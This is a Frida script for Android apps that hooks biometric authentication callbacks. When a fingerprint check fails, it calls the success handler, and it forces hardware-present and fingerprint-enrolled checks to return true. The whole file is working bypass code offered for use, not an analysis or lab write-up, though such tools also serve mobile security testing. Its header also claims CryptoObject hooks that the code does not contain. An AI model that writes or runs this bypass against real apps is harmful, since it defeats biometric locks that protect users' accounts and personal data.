// Biometric & Fingerprint Authentication Bypass
// Hooks: BiometricPrompt, FingerprintManager, CryptoObject verification
Java.perform(function () {
    console.log("[*] Initializing Biometric Authentication Bypass...");

    // 1. BiometricPrompt.AuthenticationCallback.onAuthenticationFailed Hook
    try {
        var BiometricPrompt = Java.use("android.hardware.biometrics.BiometricPrompt$AuthenticationCallback");
        BiometricPrompt.onAuthenticationFailed.implementation = function () {
            console.log("[+] Intercepted onAuthenticationFailed — forcing onAuthenticationSucceeded");
            this.onAuthenticationSucceeded(null);
        };
    } catch (e) {}

    // 2. androidx.biometric.BiometricPrompt.AuthenticationCallback
    try {
        var AndroidXBiometric = Java.use("androidx.biometric.BiometricPrompt$AuthenticationCallback");
        AndroidXBiometric.onAuthenticationFailed.implementation = function () {
            console.log("[+] Intercepted AndroidX onAuthenticationFailed — forcing onAuthenticationSucceeded");
            this.onAuthenticationSucceeded(null);
        };
    } catch (e) {}

    // 3. FingerprintManagerCompat
    try {
        var FingerprintManagerCompat = Java.use("androidx.core.hardware.fingerprint.FingerprintManagerCompat");
        FingerprintManagerCompat.hasEnrolledFingerprints.implementation = function () {
            console.log("[+] FingerprintManagerCompat.hasEnrolledFingerprints -> true");
            return true;
        };
        FingerprintManagerCompat.isHardwareDetected.implementation = function () {
            console.log("[+] FingerprintManagerCompat.isHardwareDetected -> true");
            return true;
        };
    } catch (e) {}

    console.log("[*] Biometric Bypass Hooks Active");
});
